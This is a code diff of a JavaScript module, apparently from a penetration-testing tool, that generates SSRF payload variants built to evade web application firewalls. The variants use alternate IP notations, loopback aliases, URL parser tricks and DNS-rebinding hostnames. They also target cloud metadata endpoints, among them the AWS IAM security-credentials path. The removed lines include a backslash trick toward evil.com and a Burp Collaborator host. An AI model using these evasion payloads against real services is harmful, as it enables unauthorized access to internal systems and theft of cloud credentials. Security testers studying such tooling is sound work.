@@ -1,253 +1,162 @@
-/**
- * SSRF WAF Bypass Engine
- * Generates multiple evasion variants for SSRF payloads.
- * Supports: HTTP, Cloud Metadata
- */
+/** Target-aware SSRF URL-obfuscation engine. */
 
-import { ipToDecimal, ipToHex, ipToOctal, urlEncode } from '../utils/encoding'
-import { extractIp, extractPath, parseUrl, pickOne } from '../utils/helpers'
+import { ipToDecimal, ipToHex, ipToOctal, urlEncode } from '../utils/encoding.js'
+import { extractHostnameIp, parseUrl } from '../utils/helpers.js'
+import { finalizeVariants } from '../utils/variants.js'
 
-/* ── IP Decimal Notation ──────────────────────────── */
+function userInfo(parsed) {
+  return parsed.credentials ?? ''
+}
+function displayHost(hostname) {
+  if (hostname.includes(':') && !hostname.startsWith('[')) return `[${hostname}]`
+  return hostname
+}
+
+function rebuildUrl(parsed, hostname, options = {}) {
+  const port = options.port === undefined ? parsed.port : options.port
+  const credentials = options.credentials === undefined ? userInfo(parsed) : options.credentials
+  const path = options.path ?? parsed.rawSuffix
+  return `${parsed.protocol}//${credentials}${displayHost(hostname)}${port ? `:${port}` : ''}${path}`
+}
+
+function withParsedUrl(payload, transform) {
+  const parsed = parseUrl(payload)
+  if (!parsed.valid) return []
+  return transform(parsed)
+}
+
 function applyIpDecimal(payload) {
-  const variants = []
-  const ip = extractIp(payload)
-  if (!ip) return [payload]
-
-  const decimal = ipToDecimal(ip)
-  const path = extractPath(payload)
-
-  // http://2130706433/path
-  variants.push(payload.replace(ip, String(decimal)))
-
-  // With explicit port
-  const parsed = parseUrl(payload)
-  if (parsed.valid && parsed.port) {
-    variants.push(`${parsed.protocol}//${decimal}:${parsed.port}${path}`)
-  }
-
-  return variants
+  const ip = extractHostnameIp(payload)
+  if (!ip) return []
+  return withParsedUrl(payload, (parsed) => [rebuildUrl(parsed, String(ipToDecimal(ip)))])
 }
 
-/* ── IP Hex Notation ──────────────────────────────── */
 function applyIpHex(payload) {
-  const variants = []
-  const ip = extractIp(payload)
-  if (!ip) return [payload]
-
-  const hex = ipToHex(ip)
-  const path = extractPath(payload)
-
-  // http://0x7f000001/path
-  variants.push(payload.replace(ip, hex))
-
-  // Per-octet hex: 0x7f.0x00.0x00.0x01
-  const perOctet = ip.split('.').map(p => '0x' + Number(p).toString(16).padStart(2, '0')).join('.')
-  variants.push(payload.replace(ip, perOctet))
-
-  return variants
+  const ip = extractHostnameIp(payload)
+  if (!ip) return []
+  return withParsedUrl(payload, (parsed) => {
+    const perOctet = ip.split('.')
+      .map((part) => `0x${Number(part).toString(16).padStart(2, '0')}`)
+      .join('.')
+    return [rebuildUrl(parsed, ipToHex(ip)), rebuildUrl(parsed, perOctet)]
+  })
 }
 
-/* ── IP Octal Notation ────────────────────────────── */
 function applyIpOctal(payload) {
-  const variants = []
-  const ip = extractIp(payload)
-  if (!ip) return [payload]
-
-  const octal = ipToOctal(ip)
-  // http://0177.0000.0000.0001/path
-  variants.push(payload.replace(ip, octal))
-
-  // Mixed notation: first octet as octal, rest as decimal
-  const parts = ip.split('.')
-  const mixed = '0' + Number(parts[0]).toString(8) + '.' + parts.slice(1).join('.')
-  variants.push(payload.replace(ip, mixed))
-
-  return variants
-}
-
-/* ── IP Short Forms ───────────────────────────────── */
-function applyIpShort(payload) {
-  const variants = []
-  const ip = extractIp(payload)
-  if (!ip) return [payload]
-  const path = extractPath(payload)
-
-  // Check if it's a loopback address
-  if (ip === '127.0.0.1' || ip.startsWith('127.')) {
-    // http://127.1
-    variants.push(payload.replace(ip, '127.1'))
-    // http://0/
-    variants.push(payload.replace(ip, '0'))
-    // http://0.0.0.0
-    variants.push(payload.replace(ip, '0.0.0.0'))
-    // localhost
-    variants.push(payload.replace(ip, 'localhost'))
-    // [::1] IPv6 loopback
-    variants.push(payload.replace(ip, '[::1]'))
-    // [::ffff:127.0.0.1] IPv6 mapped
-    variants.push(payload.replace(ip, '[::ffff:127.0.0.1]'))
-    // [0:0:0:0:0:ffff:127.0.0.1]
-    variants.push(payload.replace(ip, '[0:0:0:0:0:ffff:127.0.0.1]'))
-  } else {
-    // Generic IP shortening: strip trailing .0 octets
+  const ip = extractHostnameIp(payload)
+  if (!ip) return []
+  return withParsedUrl(payload, (parsed) => {
     const parts = ip.split('.')
-    if (parts[3] === '0') {
-      variants.push(payload.replace(ip, parts.slice(0, 3).join('.')))
+    const mixed = `0${Number(parts[0]).toString(8)}.${parts.slice(1).join('.')}`
+    return [rebuildUrl(parsed, ipToOctal(ip)), rebuildUrl(parsed, mixed)]
+  })
+}
+
+function applyIpShort(payload) {
+  const ip = extractHostnameIp(payload)
+  if (!ip) return []
+  return withParsedUrl(payload, (parsed) => {
+    if (ip.startsWith('127.')) {
+      return [
+        rebuildUrl(parsed, '127.1'),
+        rebuildUrl(parsed, '0'),
+        rebuildUrl(parsed, 'localhost'),
+        rebuildUrl(parsed, '::1'),
+        rebuildUrl(parsed, '::ffff:127.0.0.1'),
+      ]
     }
-    // [::ffff:IP]
-    variants.push(payload.replace(ip, `[::ffff:${ip}]`))
-  }
-
-  return variants
+    const parts = ip.split('.')
+    return [rebuildUrl(parsed, `::ffff:${ip}`), ...(parts[3] === '0' ? [rebuildUrl(parsed, parts.slice(0, 3).join('.'))] : [])]
+  })
 }
 
-/* ── URL Obfuscation Tricks ───────────────────────── */
 function applyUrlTricks(payload) {
+  return withParsedUrl(payload, (parsed) => {
+    const host = parsed.hostname
+    const path = parsed.rawSuffix
+    const variants = [
+      rebuildUrl(parsed, `${host}.`),
+      rebuildUrl(parsed, urlEncode(host)),
+      rebuildUrl(parsed, host, { path: `//${path.replace(/^\//, '')}` }),
+    ]
+
+    // Replacing supplied credentials changes authenticated request semantics.
+    // Only introduce userinfo when the original URL did not already contain it.
+    if (!parsed.credentials) variants.unshift(rebuildUrl(parsed, host, { credentials: 'anything@' }))
+
+    if (!parsed.port) {
+      variants.push(rebuildUrl(parsed, host, { port: parsed.protocol === 'https:' ? '443' : '80' }))
+    }
+    return variants
+  })
+}
+
+function applyDnsRedirect(payload, target) {
   const variants = []
+  const ip = extractHostnameIp(payload)
   const parsed = parseUrl(payload)
-  if (!parsed.valid) return [payload]
 
-  const ip = extractIp(payload)
-  const path = extractPath(payload)
-  const host = ip || parsed.hostname
+  if (target === 'cloud') {
+    const protocol = parsed.valid ? parsed.protocol : 'http:'
+    variants.push(
+      `${protocol}//169.254.169.254/latest/meta-data/`,
+      `${protocol}//169.254.169.254/latest/meta-data/iam/security-credentials/`,
+      `${protocol}//metadata.google.internal/computeMetadata/v1/`,
+      `${protocol}//100.100.100.200/latest/meta-data/`,
+    )
+  }
 
-  // Embedded credentials: http://evil@target/path
-  variants.push(`${parsed.protocol}//anything@${host}${path}`)
-
-  // URL-encoded host
-  variants.push(`${parsed.protocol}//${urlEncode(host)}${path}`)
-
-  // Backslash trick: http://host\@evil.com
-  variants.push(`${parsed.protocol}//${host}\\@evil.com${path}`)
-
-  // Fragment trick
-  variants.push(`${parsed.protocol}//${host}${path}#`)
-
-  // Double slash in path
-  variants.push(`${parsed.protocol}//${host}//${path.replace(/^\//, '')}`)
-
-  // URL with port 80 explicitly
-  if (!parsed.port) {
-    variants.push(`${parsed.protocol}//${host}:80${path}`)
-    variants.push(`${parsed.protocol}//${host}:443${path}`)
+  if (parsed.valid && ip?.startsWith('127.')) {
+    variants.push(
+      rebuildUrl(parsed, 'localtest.me'),
+      rebuildUrl(parsed, '127.0.0.1.nip.io'),
+      rebuildUrl(parsed, '127.0.0.1.sslip.io'),
+    )
   }
 
   return variants
 }
 
-/* ── DNS / Redirect Bypass ────────────────────────── */
-function applyDnsRedirect(payload) {
-  const variants = []
-  const ip = extractIp(payload)
-  const path = extractPath(payload)
-
-  if (ip === '127.0.0.1' || ip?.startsWith('127.')) {
-    // [::] IPv6 unspecified
-    variants.push(payload.replace(ip, '[::]'))
-    // 0.0.0.0
-    variants.push(payload.replace(ip, '0.0.0.0'))
-    // localtest.me (resolves to 127.0.0.1)
-    variants.push(payload.replace(ip, 'localtest.me'))
-    // spoofed.burpcollaborator.net style
-    variants.push(payload.replace(ip, 'spoofed.burpcollaborator.net'))
-    // nip.io
-    variants.push(payload.replace(ip, '127.0.0.1.nip.io'))
-    // sslip.io
-    variants.push(payload.replace(ip, '127.0.0.1.sslip.io'))
-  }
-
-  // Cloud metadata endpoints
-  const cloudVariants = [
-    'http://169.254.169.254/latest/meta-data/',
-    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
-    'http://metadata.google.internal/computeMetadata/v1/',
-    'http://100.100.100.200/latest/meta-data/',
-  ]
-
-  // Add cloud metadata if payload looks like it targets internal services
-  if (payload.includes('169.254') || payload.includes('metadata') || payload.includes('127.0.0.1')) {
-    cloudVariants.forEach(cv => {
-      if (cv !== payload) variants.push(cv)
-    })
-  }
-
-  return variants
-}
-
-/* ── Main Engine ─────────────────────────────────── */
 export function generateSsrfVariants(payload, layers, target) {
   if (!payload || !payload.trim()) return []
 
-  const allVariants = []
-  allVariants.push({ payload, label: 'Original', layers: [] })
-
-  if (layers.includes('ip-decimal')) {
-    applyIpDecimal(payload).forEach(v => {
-      allVariants.push({ payload: v, label: 'IP Decimal', layers: ['ip-decimal'] })
-    })
-  }
-
-  if (layers.includes('ip-hex')) {
-    applyIpHex(payload).forEach(v => {
-      allVariants.push({ payload: v, label: 'IP Hex', layers: ['ip-hex'] })
-    })
-  }
-
-  if (layers.includes('ip-octal')) {
-    applyIpOctal(payload).forEach(v => {
-      allVariants.push({ payload: v, label: 'IP Octal', layers: ['ip-octal'] })
-    })
-  }
-
-  if (layers.includes('ip-short')) {
-    applyIpShort(payload).forEach(v => {
-      allVariants.push({ payload: v, label: 'IP Short', layers: ['ip-short'] })
-    })
-  }
-
-  if (layers.includes('url-tricks')) {
-    applyUrlTricks(payload).forEach(v => {
-      allVariants.push({ payload: v, label: 'URL Tricks', layers: ['url-tricks'] })
-    })
-  }
-
-  if (layers.includes('dns-redirect')) {
-    applyDnsRedirect(payload).forEach(v => {
-      allVariants.push({ payload: v, label: 'DNS/Redirect', layers: ['dns-redirect'] })
-    })
-  }
-
-  // Combos
-  if (layers.length >= 2) {
-    if (layers.includes('ip-decimal') && layers.includes('url-tricks')) {
-      const ip = extractIp(payload)
-      if (ip) {
-        const decimal = ipToDecimal(ip)
-        const path = extractPath(payload)
-        const parsed = parseUrl(payload)
-        if (parsed.valid) {
-          const combo = `${parsed.protocol}//anything@${decimal}${path}`
-          allVariants.push({ payload: combo, label: 'Decimal + URL Trick', layers: ['ip-decimal', 'url-tricks'] })
-        }
-      }
-    }
-
-    if (layers.includes('ip-hex') && layers.includes('ip-short')) {
-      const ip = extractIp(payload)
-      if (ip === '127.0.0.1') {
-        const combo = payload.replace(ip, '0x7f000001')
-        allVariants.push({ payload: combo, label: 'Hex + Short', layers: ['ip-hex', 'ip-short'] })
-      }
-    }
-  }
-
-  // Deduplicate
-  const seen = new Set()
-  const unique = allVariants.filter(v => {
-    if (seen.has(v.payload)) return false
-    seen.add(v.payload)
-    return true
+  const allVariants = [{ payload, label: 'Original', layers: [] }]
+  const add = (values, label, layer, extra = {}) => values.forEach((value) => {
+    allVariants.push({ payload: value, label, layers: [layer], ...extra })
   })
 
-  return unique.slice(0, 12)
+  const legacyIp = {
+    validity: 'conditional',
+    note: 'Requires a URL parser or resolver that accepts legacy non-canonical IP notation.',
+  }
+  if (layers.includes('ip-decimal')) add(applyIpDecimal(payload), 'IP Decimal', 'ip-decimal', legacyIp)
+  if (layers.includes('ip-hex')) add(applyIpHex(payload), 'IP Hex', 'ip-hex', legacyIp)
+  if (layers.includes('ip-octal')) add(applyIpOctal(payload), 'IP Octal', 'ip-octal', legacyIp)
+  if (layers.includes('ip-short')) add(applyIpShort(payload), 'IP Short', 'ip-short', legacyIp)
+  if (layers.includes('url-tricks')) add(applyUrlTricks(payload), 'URL Parser Trick', 'url-tricks', {
+    validity: 'conditional',
+    note: 'Behavior depends on how the target URL parser normalizes the authority.',
+  })
+  if (layers.includes('dns-redirect')) add(applyDnsRedirect(payload, target), 'DNS/Metadata Variant', 'dns-redirect', {
+    validity: 'conditional',
+    note: target === 'cloud'
+      ? 'Cloud metadata headers and platform-specific controls may also be required.'
+      : 'Requires DNS resolution and validation behavior compatible with the selected hostname.',
+  })
+
+  if (layers.includes('ip-decimal') && layers.includes('url-tricks')) {
+    const parsed = parseUrl(payload)
+    const ip = extractHostnameIp(payload)
+    if (parsed.valid && ip) {
+      allVariants.push({
+        payload: rebuildUrl(parsed, String(ipToDecimal(ip)), { credentials: 'anything@' }),
+        label: 'Decimal + Userinfo',
+        layers: ['ip-decimal', 'url-tricks'],
+        validity: 'conditional',
+        note: 'Requires a parser that accepts legacy numeric IPv4 notation.',
+      })
+    }
+  }
+
+  return finalizeVariants(allVariants, layers)
 }
